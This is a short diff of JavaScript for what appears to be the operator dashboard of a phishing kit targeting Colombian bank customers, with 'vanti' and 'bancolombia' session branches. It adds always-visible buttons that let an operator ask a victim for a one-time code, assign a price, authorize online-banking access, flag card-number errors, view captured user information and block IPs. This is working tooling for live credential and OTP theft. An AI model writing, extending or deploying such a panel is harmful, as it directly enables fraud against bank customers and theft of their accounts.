@@ -413,18 +413,23 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    if (bancoKey === 'vanti') {
-        if (estado === 'pendiente' && !s.datos.monto && !s.datos.tarjeta) {
-            btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
-        }
-        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        btns.push(`<button class="btn btn-accept" title="Aceptar (pasa a OTP)" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
-        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-        btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
-        return btns.join('');
-    }
+  if (bancoKey === 'vanti') {
+    // 💲 Asignar Precio — siempre visible
+    btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+    // 📱 Pedir OTP — siempre visible
+    btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+    // 🔐 Autorizar Banca Virtual (reemplaza al Aceptar) — siempre visible
+    btns.push(`<button class="btn" style="background:#a855f7; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+    // ❌ Rechazar — siempre visible
+    btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+    // ⚠️ Error CC — siempre visible
+    btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
+    // 👁️ Ver Info — siempre visible
+    btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
+    // 🚫 Bloquear — siempre visible
+    btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+    return btns.join('');
+}
 
     if (bancoKey === 'bancolombia') {
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
